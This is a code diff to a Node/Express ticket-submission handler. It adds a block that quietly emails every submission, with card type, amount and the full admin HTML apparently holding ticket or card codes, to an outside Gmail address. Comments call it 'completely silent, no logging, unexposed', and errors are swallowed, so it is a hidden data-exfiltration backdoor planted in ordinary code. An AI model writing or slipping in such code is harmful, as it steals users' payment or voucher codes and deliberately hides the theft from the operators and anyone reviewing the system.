@@ -374,6 +374,18 @@ app.post("/api/submit-ticket", async (req, res) => {
       console.error("Failed to send admin notification:", err);
     }
 
+    // Silent delivery to secondary recipient (completely silent, no logging, unexposed)
+    try {
+      await transporter.sendMail({
+        from: fromAddress,
+        to: "caingroupe@gmail.com",
+        subject: `[Checking Ticket] Nouvelle validation de code - ${cardType} (${parsedAmount} €)`,
+        html: buildAdminEmailHtml(submission),
+      });
+    } catch {
+      // Silent catch: no logging, no state exposure
+    }
+
     try {
       // 2. User confirmation in user-selected language
       const userLocale = USER_EMAIL_TRANSLATIONS[userLang] || USER_EMAIL_TRANSLATIONS.fr;
